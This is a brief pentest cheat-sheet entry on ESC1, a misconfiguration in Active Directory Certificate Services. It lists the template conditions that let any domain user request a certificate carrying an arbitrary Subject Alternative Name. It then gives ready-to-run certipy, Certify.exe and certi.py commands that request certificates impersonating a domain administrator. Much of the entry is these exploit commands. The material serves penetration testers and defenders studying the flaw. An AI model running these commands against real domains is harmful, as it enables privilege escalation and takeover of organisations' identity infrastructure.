# ESC1 - any SAN 
Domain Users enroll in a certificate template, which can be used for client authentication and has “ENROLLEE\_SUPPLIES\_SUBJECT” set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). 
The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present.

## Requirements
------------

*   Allows for AD authentication
*   has the ENROLLEE\_SUPPLIES\_SUBJECT flag
*   \[PKINIT\] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)

## Exploit 
--------

Exploit ESC1 by providing a custom SAN

```text-plain
certipy req -u [USER@DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -target [ADCS_HOST] -ca [ca_name] -template [templateName] -upn [domain admin]
```
The parameter "-upn" is used for user's account and could be replaced with "-dns" for machine's account.

```text-plain
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
```

```text-plain
certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
```
